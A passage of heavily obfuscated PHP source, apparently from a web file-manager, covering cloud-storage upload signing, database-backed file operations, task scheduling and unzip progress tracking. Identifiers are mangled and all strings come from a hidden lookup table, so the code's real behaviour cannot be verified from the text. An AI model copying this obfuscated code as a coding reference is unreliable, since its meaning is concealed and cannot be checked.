$ïÇê®ìÒ[33], $ïÇê®ìÒ[76] => $Í˜ÉáÉ¶); } return array($ïÇê®ìÒ[29] => $ïÇê®ìÒ[872], $ïÇê®ìÒ[1229] => $Ò–¢¯µ->pathDriver, $ïÇê®ìÒ[76] => $Í˜ÉáÉ¶); } public static function pathDriverType($¯ôåúÍ³) { return $¯ôåúÍ³ ? self::driverType(IO::init($¯ôåúÍ³)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ëìİÑ÷•) { parent::__construct($ëìİÑ÷•); $this->signatureVersion($_SERVER[¥ÙÌÜ¾ê][212]); } public function uploadFormData($Å©Èƒû², $ò®†Œİï = 3600) { $¬èó–²† =& $_SERVER[¥ÙÌÜ¾ê]; $òı‘À¯Ñ = $¬èó–²†[192]; $†Š’Îñ¾ = $¬èó–²†[230]; $îüãõ¬· = $¬èó–²†[1236]; $ÜÑèà‘Õ = gmdate($¬èó–²†[1237], time() + $ò®†Œİï); $á½œºˆñ = (string) time() . $¬èó–²†[68] . (string) (time() + $ò®†Œİï); $‚Èµù”« = array($¬èó–²†[1238] => $ÜÑèà‘Õ, $¬èó–²†[1239] => array(array($¬èó–²†[1240] => $òı‘À¯Ñ), array($¬èó–²†[1241] => $this->bucket), array($¬èó–²†[1242], $¬èó–²†[1243], $¬èó–²†[33]), array($¬èó–²†[1244] => $îüãõ¬·), array($¬èó–²†[1245] => $†Š’Îñ¾), array($¬èó–²†[1246] => $this->accessKey), array($¬èó–²†[1247] => $á½œºˆñ))); $‚Èµù”« = json_encode($‚Èµù”«); $ÛÜÅÈ”© = hash_hmac($¬èó–²†[230], $á½œºˆñ, $this->secret); $è½Ä©Ã– = sha1($‚Èµù”«); $ÅêÂäÄ• = hash_hmac($¬èó–²†[230], $è½Ä©Ã–, $ÛÜÅÈ”©); $éÎò± = array($¬èó–²†[1240] => $òı‘À¯Ñ, $¬èó–²†[1244] => $îüãõ¬·, $¬èó–²†[1248] => base64_encode($‚Èµù”«), $¬èó–²†[1245] => $†Š’Îñ¾, $¬èó–²†[1246] => $this->accessKey, $¬èó–²†[1249] => $á½œºˆñ, $¬èó–²†[1250] => $ÅêÂäÄ•, $¬èó–²†[175] => $this->getHost()); return $éÎò±; } public function fileOutLink($øûªïõ) { $ÛÍÜ×óï =& $_SERVER[¥ÙÌÜ¾ê]; if (substr($øûªïõ, 0, 7) == $ÛÍÜ×óï[1251]) { $øûªïõ = $ÛÍÜ×óï[1252] . substr($øûªïõ, 7); } header($ÛÍÜ×óï[159] . $øûªïõ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ûŒ¼“Ò) { $this->pathParse = $ûŒ¼“Ò; $this->model = Model($_SERVER[¥ÙÌÜ¾ê][1253]); } public function getPath($Èüµ±Õ‡) { return trim($Èüµ±Õ‡, $_SERVER[¥ÙÌÜ¾ê][8]); } public function pathFather($¯›¶ŸĞ¯) { $¡´±î’ = $this->parse($¯›¶ŸĞ¯); $¡´±î’ = $this->infoSimple($¯›¶ŸĞ¯); return $¡´±î’ ? $¡´±î’[$_SERVER[¥ÙÌÜ¾ê][492]] : !1; } public function pathThis($·¸ŞÙÉ) { $Ö“×øå© = $this->infoSimple($·¸ŞÙÉ); return $Ö“×øå© ? $Ö“×øå©[$_SERVER[¥ÙÌÜ¾ê][28]] : !1; } public function getPathOuter($“‹¹‚Ø”) { if (!$“‹¹‚Ø”) { return $“‹¹‚Ø”; } $Õİº¬¥Ë = $this->parse($“‹¹‚Ø”); return KodIO::make($Õİº¬¥Ë[$_SERVER[¥ÙÌÜ¾ê][395]]); } public function copyFolderFromIO($‰£€¯ì, $Á³ª¡³, $£ˆ¾úø, $åĞ²õğ¥, $ÁŠŠ×­¹) { $àÏï”ÛÏ = $this->model->copyFolderFromIO($‰£€¯ì, $Á³ª¡³, $£ˆ¾úø, $åĞ²õğ¥, $ÁŠŠ×­¹); return KodIO::make($àÏï”ÛÏ); } public function isParentOf($»€£îâ¿, $º·€ê¹) { return $this->model->isParentOf($»€£îâ¿, $º·€ê¹); } public function mkfile($ØÓş¦„, $Î•÷ü•Ğ = '', $åƒî‡Å” = REPEAT_RENAME) { $©µ™°á¯ =& $_SERVER[¥ÙÌÜ¾ê]; $¨²å‡´À = $this->parse($ØÓş¦„); $ØÓş¦„ = $¨²å‡´À[$©µ™°á¯[395]]; for ($°ÜôÒÓà = 0; $°ÜôÒÓà < count($¨²å‡´À[$©µ™°á¯[1254]]); $°ÜôÒÓà++) { $Şº­«õê = $¨²å‡´À[$©µ™°á¯[1254]][$°ÜôÒÓà]; if ($°ÜôÒÓà == count($¨²å‡´À[$©µ™°á¯[1254]]) - 1) { $ØÓş¦„ = $this->model->mkfile($ØÓş¦„, $Şº­«õê, $Î•÷ü•Ğ, $åƒî‡Å”); break; } $ØÓş¦„ = $this->model->mkdir($ØÓş¦„, $Şº­«õê, REPEAT_SKIP); } return $this->getPathOuter($ØÓş¦„); } public function mkdir($ ¨³Ú¢Ñ, $·¶¤’Ü = REPEAT_SKIP) { $ÉíÎãÅ¤ =& $_SERVER[¥ÙÌÜ¾ê]; $¥âæİéÙ = $this->parse($ ¨³Ú¢Ñ); $ ¨³Ú¢Ñ = $¥âæİéÙ[$ÉíÎãÅ¤[395]]; for ($¢’ÍËêÑ = 0; $¢’ÍËêÑ < count($¥âæİéÙ[$ÉíÎãÅ¤[1254]]); $¢’ÍËêÑ++) { $é¶¥”ÜÌ = $¥âæİéÙ[$ÉíÎãÅ¤[1254]][$¢’ÍËêÑ]; $ ¨³Ú¢Ñ = $this->model->mkdir($ ¨³Ú¢Ñ, $é¶¥”ÜÌ, $·¶¤’Ü); } return $this->getPathOuter($ ¨³Ú¢Ñ); } public function copyFile($ÆÆŒ¿±–, $éÏ‡‡­, $ èÅù’› = REPEAT_REPLACE) { $ø±Ñè›÷ =& $_SERVER[¥ÙÌÜ¾ê]; $¸‡„êÇ = $this->parse($éÏ‡‡­); $öœÜÉÒ³ = $this->model->copy($ÆÆŒ¿±–, $¸‡„êÇ[$ø±Ñè›÷[395]], $ èÅù’›, $¸‡„êÇ[$ø±Ñè›÷[76]]); return $öœÜÉÒ³ ? $this->getPathOuter($öœÜÉÒ³) : !1; } public function moveFile($¬×ùøŒ, $şÖ¨´Û, $Ğè·¤Í = REPEAT_REPLACE) { $¬”ãÅšÃ =& $_SERVER[¥ÙÌÜ¾ê]; $ùÍ¿˜œ‚ = $this->parse($şÖ¨´Û); $ò—ô¨Ãñ = $this->model->move($¬×ùøŒ, $ùÍ¿˜œ‚[$¬”ãÅšÃ[395]], $Ğè·¤Í, $ùÍ¿˜œ‚[$¬”ãÅšÃ[76]]); return $ò—ô¨Ãñ ? $this->getPathOuter($ò—ô¨Ãñ) : !1; } public function copy($ŸÏí½æµ, $ÂĞ¢–‚î, $‘Ÿ¨¥Â¸ = REPEAT_REPLACE, $Ğş†›Æİ = false) { $•ˆ˜Ø†– = $this->parse($ÂĞ¢–‚î); $îµÒ‚ùõ = $this->model->copy($ŸÏí½æµ, $•ˆ˜Ø†–[$_SERVER[¥ÙÌÜ¾ê][395]], $‘Ÿ¨¥Â¸, $Ğş†›Æİ); return $îµÒ‚ùõ ? $this->getPathOuter($îµÒ‚ùõ) : !1; } public function moveSameAllow() { } public function move($Á—ù´úò, $ŞØ¸°²Ï, $Á¡ŒûÙà = REPEAT_REPLACE, $¬’¾¸« = false) { $ºùï…²Â = $this->parse($ŞØ¸°²Ï); $Ò›ÓüÚ‡ = $this->model->move($Á—ù´úò, $ºùï…²Â[$_SERVER[¥ÙÌÜ¾ê][395]], $Á¡ŒûÙà, $¬’¾¸«); return $Ò›ÓüÚ‡ ? $this->getPathOuter($Ò›ÓüÚ‡) : !1; } public function remove($—õ¦œ™, $ôùêßí = true) { return $this->model->remove($—õ¦œ™, $ôùêßí); } public function rename($şÄ½¼şÄ, $õà‰ŒÄÕ) { $¤Ğ­¿çê = $this->model->rename($şÄ½¼şÄ, $õà‰ŒÄÕ); return $¤Ğ­¿çê ? $this->getPathOuter($şÄ½¼şÄ) : $¤Ğ­¿çê; } public function size($½°ş¡úí) { $±İ‚˜ÈÍ = $this->infoSimple($½°ş¡úí); return $±İ‚˜ÈÍ ? $±İ‚˜ÈÍ[$_SERVER[¥ÙÌÜ¾ê][78]] : 0; } public function infoSimple($Ó¨á½) { return $this->model->sourceInfo($Ó¨á½); } public function info($ÉƒœÔ‰) { return $this->infoParse($ÉƒœÔ‰); } public function infoAuth($ËÎäá) { return $this->infoParse($ËÎäá, !1, !0); } public function infoWithChildren($öïÆä‚) { return $this->infoParse($öïÆä‚, !0); } protected function infoParse($¿óÛÉ¸¼, $ë…÷ö°¾ = false, $³“ßÃ²¤ = false) { if (!$ë…÷ö°¾) { return $this->model->pathInfo($¿óÛÉ¸¼, $³“ßÃ²¤); } return $this->model->pathInfoMore($¿óÛÉ¸¼); } public function infoFull($ÄÄÛûĞ) { $’»›•öı =& $_SERVER[¥ÙÌÜ¾ê]; $Ü•ÅÉ±ñ = explode($’»›•öı[8], $ÄÄÛûĞ); $Ü¼Íğ»Ü = implode($’»›•öı[8], array_splice($Ü•ÅÉ±ñ, 1)); return $this->model->pathInfoByPath($Ü•ÅÉ±ñ[0], $Ü¼Íğ»Ü); } public function hashSimple($ Î¸ã) { $Ãï»ÅÔš =& $_SERVER[¥ÙÌÜ¾ê]; $ƒœÂöÖÃ = $this->infoWithChildren($ Î¸ã); return $ƒœÂöÖÃ[$Ãï»ÅÔš[164]][$Ãï»ÅÔš[171]]; } public function hashMd5($¢‘¨ˆß­) { $Ì‚ĞºïÉ =& $_SERVER[¥ÙÌÜ¾ê]; $ş•„€è = $this->infoWithChildren($¢‘¨ˆß­); return $ş•„€è[$Ì‚ĞºïÉ[164]][$Ì‚ĞºïÉ[170]]; } public function exist($øŠù€¥ã) { $ºøÔ¾½ó =& $_SERVER[¥ÙÌÜ¾ê]; $ã¥ ‰Ÿ“ = $this->parse($øŠù€¥ã); if (!$ã¥ ‰Ÿ“[$ºøÔ¾½ó[76]]) { return $this->isFile($øŠù€¥ã) || $this->isFolder($øŠù€¥ã); } $—ªË²÷ = array($ºøÔ¾½ó[396] => $ã¥ ‰Ÿ“[$ºøÔ¾½ó[395]], $ºøÔ¾½ó[28] => $ã¥ ‰Ÿ“[$ºøÔ¾½ó[76]]); $ş•¡ÃÚ’ = $this->model->where($—ªË²÷)->find(); return $ş•¡ÃÚ’ ? !0 : !1; } public function isFile($ê¢óø´…) { $ìÅñ¦û¶ =& $_SERVER[¥ÙÌÜ¾ê]; $ª¼º±˜ = $this->infoSimple($ê¢óø´…); return $ª¼º±˜ && $ª¼º±˜[$ìÅñ¦û¶[405]] == $ìÅñ¦û¶[87] ? !1 : !0; } public function isFolder($Æïû¨ ) { $íú£ñ€… =& $_SERVER[¥ÙÌÜ¾ê]; $›ÇÌóà = $this->infoSimple($Æïû¨ ); return $›ÇÌóà && $›ÇÌóà[$íú£ñ€…[405]] == $íú£ñ€…[87] ? !0 : !1; } public function listPath($°÷‰¶–Ä, $ÛçÂ ¶… = false) { $’ªÓö”Ş =& $_SERVER[¥ÙÌÜ¾ê]; if ($°÷‰¶–Ä == $’ªÓö”Ş[33]) { return !1; } $—ÔÓšâÒ = array($’ªÓö”Ş[396] => $°÷‰¶–Ä); if ($ÛçÂ ¶…) { return $this->model->listSource($—ÔÓšâÒ, -1); } return $this->model->listSource($—ÔÓšâÒ); } public function has($¥š¾ÂÍÅ, $ø¡£Ê¿Ô = false, $˜Ïï˜Ëß = null) { $øâ†ôô =& $_SERVER[¥ÙÌÜ¾ê]; $îĞ–İ¬ƒ = $this->infoWithChildren($¥š¾ÂÍÅ); if ($ø¡£Ê¿Ô) { return array($øâ†ôô[204] => $îĞ–İ¬ƒ[$øâ†ôô[204]], $øâ†ôô[203] => $îĞ–İ¬ƒ[$øâ†ôô[203]]); } return $˜Ïï˜Ëß ? $îĞ–İ¬ƒ[$øâ†ôô[204]] : $îĞ–İ¬ƒ[$øâ†ôô[203]]; } public function listAll($…èòƒÅç) { $ß‡†Â³® = IO::info($this->pathParse[$_SERVER[¥ÙÌÜ¾ê][76]]); if (!$ß‡†Â³®) { return array(); } return $this->model->listAll($…èòƒÅç); } public function getContent($ìòá°Ö) { return $this->model->getContent($ìòá°Ö); } public function setContent($¶›äÅ Ø, $æêØ¹ùÁ = '') { return $this->model->setContent($¶›äÅ Ø, $æêØ¹ùÁ); } public function fileSubstr($éáÚ¶†, $ü¶Éìğç, $­­­²ÒØ) { return $this->model->fileSubstr($éáÚ¶†, $ü¶Éìğç, $­­­²ÒØ); } public function download($¢ÌÛåı, $ÄîÏú° = '') { $îıäŸ•• = get_path_father($ÄîÏú°); $¼‹ëõŸ¤ = get_path_this($ÄîÏú°); $ä¾Ô¥¡ú = $this->model->fileInfoGet($¢ÌÛåı); $ùÉ„èŸ½ = IO::copy($ä¾Ô¥¡ú[$_SERVER[¥ÙÌÜ¾ê][76]], $îıäŸ••, !1, $¼‹ëõŸ¤); return $ùÉ„èŸ½; } public function setModifyTime($ãÙİçêØ, $îˆ• ¿á = '') { $ë¶ ›³õ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ãÙİçêØ) { return; } $this->model->where(array($ë¶ ›³õ[412] => $ãÙİçêØ))->save(array($ë¶ ›³õ[84] => $îˆ• ¿á)); } public function upload($‚„ÅàÚ, $€¥ñåçò, $æ±¸ò£´ = false, $Ğµ¸ñşİ = REPEAT_REPLACE) { $ø“«ĞĞ˜ =& $_SERVER[¥ÙÌÜ¾ê]; $íç«‹Æ‰ = $this->parse($‚„ÅàÚ); $ÀëªÂ´ƒ = $this->model->addFile($íç«‹Æ‰[$ø“«ĞĞ˜[395]], $€¥ñåçò, $íç«‹Æ‰[$ø“«ĞĞ˜[76]], $æ±¸ò£´, $Ğµ¸ñşİ); return $this->getPathOuter($ÀëªÂ´ƒ); } public function uploadFileByID($òõƒÀÈ¢, $êğƒ¤™ä, $Ó“Ò¶ò) { $Óƒü£Ãç =& $_SERVER[¥ÙÌÜ¾ê]; $¨é±ò¦Û = $this->parse($òõƒÀÈ¢); $Ä¢§Ö = $this->model->addFileByFileID($¨é±ò¦Û[$Óƒü£Ãç[395]], $êğƒ¤™ä, $¨é±ò¦Û[$Óƒü£Ãç[76]], $Ó“Ò¶ò); return $this->getPathOuter($Ä¢§Ö); } public function addFileByRemote($¡ä“È‘¥, $·Á†ùáà, $¸¤İ¤›É = array(), $ğĞØİš¤ = '', $éèÍæ®ú) { $æÜ—•Õ‘ =& $_SERVER[¥ÙÌÜ¾ê]; $Ó‰¼ğÚ™ = $this->parse($¡ä“È‘¥); $ğĞØİš¤ = empty($ğĞØİš¤) ? $Ó‰¼ğÚ™[$æÜ—•Õ‘[76]] : $ğĞØİš¤; $û¤ĞÒ„ = $this->model->addFileByRemote($Ó‰¼ğÚ™[$æÜ—•Õ‘[395]], $·Á†ùáà, $ğĞØİš¤, $¸¤İ¤›É, $éèÍæ®ú); return $this->getPathOuter($û¤ĞÒ„); } public function uploadLink($§«­ñÑ, $Ğ¦£½Ë = 0) { $îï³›“± =& $_SERVER[¥ÙÌÜ¾ê]; $ÙİÅã‡£ = $this->parse($§«­ñÑ); $Î”«Ö˜İ = _get($GLOBALS[$îï³›“±[7]], $îï³›“±[1255]); $·ÉíåèÁ = _get($GLOBALS[$îï³›“±[7]], $îï³›“±[1256]); $§«­ñÑ = Model($îï³›“±[597])->createFileName($ÙİÅã‡£[$îï³›“±[76]], $Î”«Ö˜İ, $·ÉíåèÁ); return IO::uploadLink($§«­ñÑ, $Ğ¦£½Ë); } public function fileNameAuto($¹áÎ»×É, $Âö·›×Ó, $ù‹‹Î©à = REPEAT_REPLACE, $×¸ç¼¢İ = false) { return $this->model->fileNameAuto($¹áÎ»×É, $Âö·›×Ó, $ù‹‹Î©à, $×¸ç¼¢İ); } public function fileNameExist($Şó¾—¸, $Ÿ¨¯Ç¢¥) { return $this->model->fileNameExist($Şó¾—¸, $Ÿ¨¯Ç¢¥); } protected function _fileOut($Ç˜˜Õ¨º, $®Ì›¤æ = false, $ûÕ¥ÃÃ = false, $Ô˜À‹‰Ñ = '', $£Ğâ•© = false) { $ÀìÃø =& $_SERVER[¥ÙÌÜ¾ê]; $ÍñõÔ´ = $this->model->sourceInfo($Ç˜˜Õ¨º); if ($ÍñõÔ´[$ÀìÃø[405]] == $ÀìÃø[87]) { header($ÀìÃø[1257]); die; } $òæºäÉ = $this->model->fileInfoGet($Ç˜˜Õ¨º); $Ô˜À‹‰Ñ = $òæºäÉ[$ÀìÃø[170]] ? $òæºäÉ[$ÀìÃø[170]] : $Ô˜À‹‰Ñ; $Åá…Ìİ¶ = isset($GLOBALS[$ÀìÃø[1258]]) ? $GLOBALS[$ÀìÃø[1258]] : $ÍñõÔ´[$ÀìÃø[28]]; if ($£Ğâ•©) { return IO::fileOutServer($òæºäÉ[$ÀìÃø[76]], $®Ì›¤æ, $Åá…Ìİ¶, $Ô˜À‹‰Ñ); } IO::fileOut($òæºäÉ[$ÀìÃø[76]], $®Ì›¤æ, $Åá…Ìİ¶, $Ô˜À‹‰Ñ); } public function fileOut($ãĞÌÙ½°, $š×ğø€° = false, $œüèé¶† = false, $••ÙÙã = '') { $this->_fileOut($ãĞÌÙ½°, $š×ğø€°, $œüèé¶†, $••ÙÙã); } public function fileOutServer($øÄµÑÄ, $îŒ¥ÔáÓ = false, $öª“®÷« = false, $ªòßŠñó = '') { $this->_fileOut($øÄµÑÄ, $îŒ¥ÔáÓ, $öª“®÷«, $ªòßŠñó, !0); } protected function _fileOutImage($åªÙ ºØ, $‹õ–Œı = 250) { $×—š¼Éä =& $_SERVER[¥ÙÌÜ¾ê]; $ì¨£¢¶ = $this->model->pathInfo($åªÙ ºØ); if ($ì¨£¢¶[$×—š¼Éä[405]] == $×—š¼Éä[87]) { show_json($×—š¼Éä[1259] . $åªÙ ºØ, !1); } $…“ñ´è« = $this->model->fileInfoGet($åªÙ ºØ); $…“ñ´è«[$×—š¼Éä[28]] = $ì¨£¢¶[$×—š¼Éä[28]]; $…“ñ´è«[$×—š¼Éä[163]] = $ì¨£¢¶[$×—š¼Éä[163]]; $GLOBALS[$×—š¼Éä[1258]] = $…“ñ´è«[$×—š¼Éä[28]]; $GLOBALS[$×—š¼Éä[162]] = $…“ñ´è«; IO::fileOutImage($…“ñ´è«[$×—š¼Éä[76]], $‹õ–Œı); } public function fileOutImage($—ıà™ÄÍ, $óóñßÏç = 250) { $this->_fileOutImage($—ıà™ÄÍ, $óóñßÏç); } public function fileOutImageServer($Âêè°ëˆ, $ä´ŞÉèÅ = 250) { $this->_fileOutImage($Âêè°ëˆ, $ä´ŞÉèÅ); } public function link($Ëşç—Êª, $à›×ªæ = '') { $‰Ñìµ = $this->model->fileInfoGet($Ëşç—Êª); return IO::link($‰Ñìµ[$_SERVER[¥ÙÌÜ¾ê][76]], $à›×ªæ); } protected function parse($‹µËÂşÖ) { $£Éù‰’‘ =& $_SERVER[¥ÙÌÜ¾ê]; if (strstr($‹µËÂşÖ, $£Éù‰’‘[8]) === !1) { return array($£Éù‰’‘[414] => intval($‹µËÂşÖ), $£Éù‰’‘[76] => $£Éù‰’‘[33], $£Éù‰’‘[1254] => array()); } $Â´öàéË = explode($£Éù‰’‘[8], trim($‹µËÂşÖ, $£Éù‰’‘[8])); if (count($Â´öàéË) < 2) { show_tips(clear_html($‹µËÂşÖ) . $£Éù‰’‘[1260]); } return array($£Éù‰’‘[414] => intval($Â´öàéË[0]), $£Éù‰’‘[76] => $Â´öàéË[1], $£Éù‰’‘[1254] => array_slice($Â´öàéË, 1)); } } goto dÅ±­‹‰ó–; bˆëÑÀë: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ë ·¥Ü¾, $Ì“›ò×¦ = 5.0) { if (!$Ë ·¥Ü¾) { return; } $Â‰¢ØÇ® = Cache::get($Ë ·¥Ü¾); if (!$Â‰¢ØÇ® || timeFloat() - floatVal($Â‰¢ØÇ®) >= $Ì“›ò×¦) { Cache::set($Ë ·¥Ü¾, timeFloat(), $Ì“›ò×¦ * 10); return !0; } return !1; } public static function timeLimitCall($Š´Àİ¶, $Ï¿­Ö ¾, $óÎ†ÂÎ†, $Áì¦àšÓ = 5.0) { $›æì“© =& $_SERVER[¥ÙÌÜ¾ê]; if (!$Š´Àİ¶ || !$Ï¿­Ö ¾) { return; } self::$asyncAdd = !0; $”œÜ‹Úî = $›æì“©[1662]; $üÉ„ä€Ö = Cache::get($”œÜ‹Úî, !0); $ØæŞÓ÷ = array($›æì“©[1663] => timeFloat(), $›æì“©[1664] => timeFloat(), $›æì“©[262] => $Ï¿­Ö ¾, $›æì“©[1657] => $óÎ†ÂÎ†, $›æì“©[197] => $Áì¦àšÓ); if (is_array($üÉ„ä€Ö[$Š´Àİ¶])) { $ØæŞÓ÷[$›æì“©[1664]] = $üÉ„ä€Ö[$Š´Àİ¶][$›æì“©[1664]]; } if (is_array($üÉ„ä€Ö[$Š´Àİ¶])) { if (timeFloat() - $üÉ„ä€Ö[$Š´Àİ¶][$›æì“©[1663]] < $ØæŞÓ÷[$›æì“©[197]] * 0.3) { return; } $ØæŞÓ÷[$›æì“©[1664]] = $üÉ„ä€Ö[$Š´Àİ¶][$›æì“©[1664]]; } $üÉ„ä€Ö[$Š´Àİ¶] = $ØæŞÓ÷; Cache::set($”œÜ‹Úî, $üÉ„ä€Ö, 60); Cache::removeMemory($”œÜ‹Úî); write_log($›æì“©[1665] . $Š´Àİ¶ . $›æì“©[68] . $Ï¿­Ö ¾, $›æì“©[1659]); } public static function timeLimitCallLoop() { $íŠ§Ó™¶ =& $_SERVER[¥ÙÌÜ¾ê]; $º—…Œá = array($íŠ§Ó™¶[1666]); $¢Øü½“ = in_array(strtolower(ACTION), $º—…Œá); if (!$¢Øü½“ && !self::$asyncAdd) { return; } $¥ù¶Í¥ = $íŠ§Ó™¶[1662]; $Äş×Îšß = Cache::get($¥ù¶Í¥, !0); if (!$Äş×Îšß || count($Äş×Îšß) <= 0) { return; } $£ûè»­ = !1; $Ñ¢âÓ“Œ = timeFloat(); $èÖ¥áÀ… = array(); foreach ($Äş×Îšß as $î‰†¾Ñ• => $®ÚÜ›ñ) { if ($Ñ¢âÓ“Œ - $®ÚÜ›ñ[$íŠ§Ó™¶[1664]] > $®ÚÜ›ñ[$íŠ§Ó™¶[197]]) { $£ûè»­ = !0; try { Hook::apply($®ÚÜ›ñ[$íŠ§Ó™¶[262]], $®ÚÜ›ñ[$íŠ§Ó™¶[1657]]); write_log($íŠ§Ó™¶[1667] . $î‰†¾Ñ• . $íŠ§Ó™¶[68] . $®ÚÜ›ñ[$íŠ§Ó™¶[262]] . $íŠ§Ó™¶[1668] . ACTION, $íŠ§Ó™¶[1659]); } catch (Exception $È…½÷Á˜) { } continue; } $èÖ¥áÀ…[$î‰†¾Ñ•] = $®ÚÜ›ñ; } if (!$£ûè»­) { return; } if (!$èÖ¥áÀ…) { return Cache::remove($¥ù¶Í¥); } Cache::set($¥ù¶Í¥, $èÖ¥áÀ…, 60); Cache::removeMemory($¥ù¶Í¥); } public static function finished($ß•Æ‰©ê, $´·‹’–è) { $³«ø·à¢ =& $_SERVER[¥ÙÌÜ¾ê]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($³«ø·à¢[262] => $ß•Æ‰©ê, $³«ø·à¢[1657] => $´·‹’–è); } private static function finishedRun() { $†µéÀıĞ =& $_SERVER[¥ÙÌÜ¾ê]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ú³â²¢í) { try { Hook::apply($ú³â²¢í[$†µéÀıĞ[262]], $ú³â²¢í[$†µéÀıĞ[1657]]); } catch (Exception $ÊŞâ ˜¥) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $®½ÑâôÎ =& $_SERVER[¥ÙÌÜ¾ê]; parent::startAfter(); Hook::bind($®½ÑâôÎ[1669], array($this, $®½ÑâôÎ[1670])); Hook::bind($®½ÑâôÎ[1124], array($this, $®½ÑâôÎ[1671])); $Ê§Ü =& $this->task; $Ê§Ü[$®½ÑâôÎ[1672]] = $®½ÑâôÎ[1129]; if (!$Ê§Ü[$®½ÑâôÎ[1481]]) { $Ê§Ü[$®½ÑâôÎ[1481]] = LNG($®½ÑâôÎ[1673]); } } protected function endAfter() { $±éê•Ñ =& $_SERVER[¥ÙÌÜ¾ê]; parent::endAfter(); Hook::unbind($±éê•Ñ[1669], array($this, $±éê•Ñ[1670])); Hook::unbind($±éê•Ñ[1124], array($this, $±éê•Ñ[1671])); } public function updateAfter() { $£•çŒÅŠ =& $_SERVER[¥ÙÌÜ¾ê]; $ÜÅªĞğ =& $this->task; if (!$ÜÅªĞğ[$£•çŒÅŠ[1059]] || !$ÜÅªĞğ[$£•çŒÅŠ[756]]) { return; } if ($ÜÅªĞğ[$£•çŒÅŠ[1672]] == $£•çŒÅŠ[1129]) { $ÃÊÁ™ş¡ = 0; if ($ÜÅªĞğ[$£•çŒÅŠ[1628]]) { $ÃÊÁ™ş¡ = $ÜÅªĞğ[$£•çŒÅŠ[1629]] / $ÜÅªĞğ[$£•çŒÅŠ[1628]]; } $ÜÅªĞğ[$£•çŒÅŠ[1583]] = $ÃÊÁ™ş¡ * 0.3; } else { if ($ÜÅªĞğ[$£•çŒÅŠ[1672]] == $£•çŒÅŠ[311]) { $ÃÊÁ™ş¡ = $ÜÅªĞğ[$£•çŒÅŠ[1582]] / $ÜÅªĞğ[$£•çŒÅŠ[1059]]; $ÜÅªĞğ[$£•çŒÅŠ[1583]] = 0.3 + $ÃÊÁ™ş¡ * 0.4; } else { if ($ÜÅªĞğ[$£•çŒÅŠ[1672]] == $£•çŒÅŠ[107]) { $Åš¾Ì½Æ = 0; if ($ÜÅªĞğ[$£•çŒÅŠ[1630]] == $£•çŒÅŠ[107]) { $Åš¾Ì½Æ = $ÜÅªĞğ[$£•çŒÅŠ[1629]]; } $ÃÊÁ™ş¡ = ($ÜÅªĞğ[$£•çŒÅŠ[1633]] + $Åš¾Ì½Æ) / $ÜÅªĞğ[$£•çŒÅŠ[756]]; $ÜÅªĞğ[$£•çŒÅŠ[1583]] = 0.3 + 0.4 + $ÃÊÁ™ş¡ * 0.3; } } } if ($ÜÅªĞğ[$£•çŒÅŠ[1583]] > 0) { $ßÚöĞ„ = timeFloat() - $ÜÅªĞğ[$£•çŒÅŠ[782]] - $ÜÅªĞğ[$£•çŒÅŠ[1586]]; $ÜÅªĞğ[$£•çŒÅŠ[1587]] = $ßÚöĞ„ * (1 - $ÜÅªĞğ[$£•çŒÅŠ[1583]]) / $ÜÅªĞğ[$£•çŒÅŠ[1583]]; } } public function addFile($ÚËà¤·) { $š½îÆİ =& $_SERVER[¥ÙÌÜ¾ê]; $Å‰†ìÄ† =& $this->task; $îéÎ õı = IO::info($ÚËà¤·); $Å‰†ìÄ†[$š½îÆİ[1626]] = $îéÎ õı[$š½îÆİ[28]]; $Å‰†ìÄ†[$š½îÆİ[1628]] = $îéÎ õı[$š½îÆİ[78]]; $Å‰†ìÄ†[$š½îÆİ[1629]] = 0; $Å‰†ìÄ†[$š½îÆİ[1061]] = $š½îÆİ[1648]; $Å‰†ìÄ†[$š½îÆİ[1630]] = $š½îÆİ[1129]; $Å‰†ìÄ†[$š½îÆİ[756]] = $îéÎ õı[$š½îÆİ[78]]; $Å‰†ìÄ†[$š½îÆİ[1059]] = 1; $¨Ë¶À¿ø = 0; $Å‰†ìÄ†[$š½îÆİ[1637]] = array($š½îÆİ[1638] => $¨Ë¶À¿ø + 1, $š½îÆİ[415] => $îéÎ õı[$š½îÆİ[28]], $š½îÆİ[76] => $îéÎ õı[$š½îÆİ[76]], $š½îÆİ[513] => $îéÎ õı[$š½îÆİ[513]] ? $îéÎ õı[$š½îÆİ[513]] : $îéÎ õı[$š½îÆİ[76]]); $this->update(); } public function unzipAfter($½Èäş£ô) { $Ù†î¦ =& $_SERVER[¥ÙÌÜ¾ê]; $ŠÒßââ‡ =& $this->task; $ŠÒßââ‡[$Ù†î¦[1672]] = $Ù†î¦[107]; $ä¯²ìå˜ = IO::infoWithChildren($½Èäş£ô); $´Œ¸—üˆ = 0; $ŠÒßââ‡[$Ù†î¦[1637]] = array($Ù†î¦[1638] => $´Œ¸—üˆ + 1, $Ù†î¦[415] => $ä¯²ìå˜[$Ù†î¦[28]], $Ù†î¦[76] => $ä¯²ìå˜[$Ù†î¦[76]], $Ù†î¦[513] => $ä¯²ìå˜[$Ù†î¦[513]] ? $ä¯²ìå˜[$Ù†î¦[513]] : $ä¯²ìå˜[$Ù†î¦[76]]); if ($ä¯²ìå˜[$Ù†î¦[29]] == $Ù†î¦[193]) { $ŠÒßââ‡[$Ù†î¦[1059]] = 1; } else { $ŠÒßââ‡[$Ù†î¦[1059]] = $ä¯²ìå˜[$Ù†î¦[81]][$Ù†î¦[79]]; } $ŠÒßââ‡[$Ù†î¦[1061]] = $Ù†î¦[33]; $ŠÒßââ‡[$Ù†î¦[1630]] = 0; $ŠÒßââ‡[$Ù†î¦[1582]] = 0; $ŠÒßââ‡[$Ù†î¦[1628]] = 0; $ŠÒßââ‡[$Ù†î¦[1629]] = 0; $ŠÒßââ‡[$Ù†î¦[1626]] = $Ù†î¦[33]; $ŠÒßââ‡[$Ù†î¦[1633]] = 0; $ŠÒßââ‡[$Ù†î¦[756]] = $ä¯²ìå˜[$Ù†î¦[78]]; $this->update(); self::log($Ù†î¦[1674] . json_encode(array($ŠÒßââ‡, $ä¯²ìå˜))); } public function nameParse($âÛ¸¿êÎ) { $åç©š‡± =& 